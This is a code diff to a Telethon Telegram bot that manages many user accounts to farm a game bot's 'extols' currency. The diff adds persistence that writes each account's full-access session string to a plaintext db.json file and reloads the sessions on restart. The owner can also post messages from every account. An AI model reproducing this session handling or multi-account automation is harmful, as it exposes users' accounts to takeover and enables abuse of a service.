@@ -25,44 +25,111 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# File to store sessions permanently so they survive restarts
+DB_FILE = "db.json"
+
 # Initialize Manager Bot
 bot = TelegramClient('manager_session', config.API_ID, config.API_HASH).start(bot_token=config.BOT_TOKEN)
 
-# --- 2. HELPER FUNCTIONS ---
+# --- 2. PERSISTENCE FUNCTIONS (New) ---
+
+def save_database():
+    """Saves current sessions to a file so they aren't lost on restart."""
+    data = {}
+    for uid, client in database.clients.items():
+        try:
+            # We save the session string and the user's name
+            data[str(uid)] = {
+                'session': client.session.save(),
+                'name': database.user_data[uid].get('name', 'Unknown')
+            }
+        except Exception as e:
+            logger.error(f"Failed to save session for {uid}: {e}")
+    
+    with open(DB_FILE, 'w') as f:
+        json.dump(data, f, indent=4)
+    logger.info("Database saved to disk.")
+
+async def load_database():
+    """Reloads sessions from file on startup."""
+    if not os.path.exists(DB_FILE):
+        return
+
+    logger.info("🔄 Reloading sessions from database...")
+    try:
+        with open(DB_FILE, 'r') as f:
+            data = json.load(f)
+        
+        count = 0
+        for uid_str, info in data.items():
+            try:
+                uid = int(uid_str)
+                session_str = info['session']
+                name = info['name']
+                
+                # Reconnect the client
+                client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
+                await client.connect()
+                
+                # Restore to memory
+                database.clients[uid] = client
+                database.user_data[uid] = {
+                    'extols': 0, 
+                    'next_play_time': 0, 
+                    'name': name
+                }
+                count += 1
+            except Exception as e:
+                logger.error(f"Failed to reload session for {uid_str}: {e}")
+        
+        logger.info(f"✅ Successfully reloaded {count} sessions.")
+        if count > 0:
+            await bot.send_message(config.OWNER_ID, f"🔄 **Bot Restarted:** Reloaded {count} active sessions.")
+
+    except Exception as e:
+        logger.error(f"Database load error: {e}")
+
+# --- 3. HELPER FUNCTIONS ---
 
 async def get_balance_for_user(user_id, client):
     """
-    Robust balance checker that ignores slot spam.
+    Robust balance checker that finds 'Є' amounts.
     """
     try:
-        # 1. Send Command
+        # 1. Send Command (No conversation lock)
         await client.send_message(config.TARGET_BOT, '/extols')
         
-        # 2. Look for the specific response (Retries for 5 seconds)
-        for _ in range(10):
-            await asyncio.sleep(3) # Wait for reply
-            
-            # Read last 3 messages to avoid missing it if a slot msg came in simultaneously
-            messages = await client.get_messages(config.TARGET_BOT, limit=3)
-            
-            for msg in messages:
-                # Look for the specific phrase "Your current extols"
-                if msg.text and "Your current extols" in msg.text:
-                    match = re.search(r'Є(\d+)', msg.text)
-                    balance = int(match.group(1)) if match else 0
-                    
-                    me = await client.get_me()
-                    # Format Name without Markdown to prevent breakage
-                    name = me.first_name 
-                    return (name, balance, None)
+        # 2. Wait slightly for reply
+        await asyncio.sleep(2)
         
-        return ("Unknown", 0, "Timeout (Bot busy?)")
+        # 3. Scan the last 5 messages to find the specific reply
+        messages = await client.get_messages(config.TARGET_BOT, limit=5)
+        
+        for msg in messages:
+            if msg.text:
+                # Look for the symbol Є or the word 'extols'
+                if "Є" in msg.text or "extols" in msg.text.lower():
+                    # Regex explanation:
+                    # Є       -> Matches the symbol
+                    # \s* -> Matches zero or more spaces (in case there's a space like Є 481)
+                    # ([\d,]+)-> Matches numbers and commas (captures 481 or 1,000)
+                    match = re.search(r'Є\s*([\d,]+)', msg.text)
+                    
+                    if match:
+                        # Remove commas and convert to int
+                        balance_str = match.group(1).replace(',', '')
+                        balance = int(balance_str)
+                        
+                        me = await client.get_me()
+                        return (me.first_name, balance, None)
+        
+        return ("Unknown", 0, "Bot did not reply with balance.")
 
     except Exception as e:
         return ("Error", 0, str(e))
 
 async def register_client(uid, client):
-    """Saves a connected client to the database."""
+    """Saves a connected client to the database and writes to disk."""
     me = await client.get_me()
     database.clients[uid] = client
     database.user_data[uid] = {
@@ -70,10 +137,14 @@ async def register_client(uid, client):
         'next_play_time': 0, 
         'name': me.first_name
     }
+    
+    # SAVE TO DISK IMMEDIATELY
+    save_database()
+    
     await bot.send_message(config.OWNER_ID, f"🔔 New Login: {me.first_name} (`{uid}`)")
     logger.info(f"User Login: {me.first_name} ({uid})")
 
-# --- 3. COMMAND HANDLERS ---
+# --- 4. COMMAND HANDLERS ---
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_cmd(event):
@@ -89,10 +160,10 @@ async def help_cmd(event):
         "`/slogin` - String Session Login\n"
         "`/logout` - Disconnect\n\n"
         "**💰 Finance:**\n"
-        "`/check` - Audit Wallets (Fixed)\n"
+        "`/check` - Audit Wallets\n"
         "`/self_reply {all|id} {group_id} {amount}`\n\n"
         "**⚙️ System:**\n"
-        "`/update` - Pull from GitHub & Restart\n"
+        "`/update` - Pull & Restart (Keeps Logins)\n"
         "`/slot` - Join Queue\n"
         "`/allslot` - Start All\n"
         "`/stats` - Global Stats\n"
@@ -101,17 +172,18 @@ async def help_cmd(event):
     )
     await event.respond(text)
 
-# --- UPDATE COMMAND ---
+# --- UPDATE COMMAND (Safe Restart) ---
 
 @bot.on(events.NewMessage(pattern='/update', from_users=[config.OWNER_ID]))
 async def update_cmd(event):
     msg = await event.respond("🔄 **Checking for updates...**")
     
+    # 1. Save data before updating just in case
+    save_database()
+    
     try:
-        # Run git pull
         process = subprocess.Popen(['git', 'pull'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, stderr = process.communicate()
-        
         output = stdout.decode() + stderr.decode()
         
         if "Already up to date" in output:
@@ -122,20 +194,18 @@ async def update_cmd(event):
             os.execl(sys.executable, sys.executable, *sys.argv)
             
     except Exception as e:
-        await msg.edit(f"❌ **Update Failed:**\n`{e}`\n\nMake sure git is installed and cloned correctly.")
+        await msg.edit(f"❌ **Update Failed:**\n`{e}`\n\nMake sure git is installed.")
 
-# --- CHECK / AUDIT COMMAND (FIXED) ---
+# --- CHECK / AUDIT COMMAND ---
 
 @bot.on(events.NewMessage(pattern='/check', from_users=[config.OWNER_ID]))
 async def check_cmd(event):
     status_msg = await event.respond("⏳ **Auditing Wallets...**\nChecking balances (this takes a few seconds)...")
     
     tasks = []
-    # Create tasks for all users
     for uid, client in database.clients.items():
         tasks.append(get_balance_for_user(uid, client))
     
-    # Run in parallel
     results = await asyncio.gather(*tasks)
     
     total_extols = 0
@@ -152,7 +222,7 @@ async def check_cmd(event):
     
     await status_msg.edit(msg)
 
-# --- SELF REPLY COMMAND (WITH GAP) ---
+# --- SELF REPLY COMMAND ---
 
 @bot.on(events.NewMessage(pattern=r'/self_reply (all|(?:\d+)) (-?\d+) (\d+)', from_users=[config.OWNER_ID]))
 async def self_reply_cmd(event):
@@ -189,8 +259,6 @@ async def self_reply_cmd(event):
                 reply_to=target_msg_id
             )
             count += 1
-            
-            # --- GAP ADDED HERE ---
             await asyncio.sleep(2) 
             
         except Exception as e:
@@ -250,6 +318,8 @@ async def logout_cmd(event):
         del database.clients[uid]
         if uid in database.user_data: del database.user_data[uid]
         if uid in database.farming_queue: database.farming_queue.remove(uid)
+        
+        save_database() # Update the file
         await event.respond("✅ **Logged out.**")
 
 # --- FARMING & STATS ---
@@ -327,5 +397,8 @@ async def simport(e):
         os.remove(f)
     except Exception as x: await e.respond(f"Error: {x}")
 
+# --- STARTUP ---
 print("✅ Manager Bot Started...")
+# Load sessions on startup
+bot.loop.run_until_complete(load_database())
 bot.run_until_disconnected()
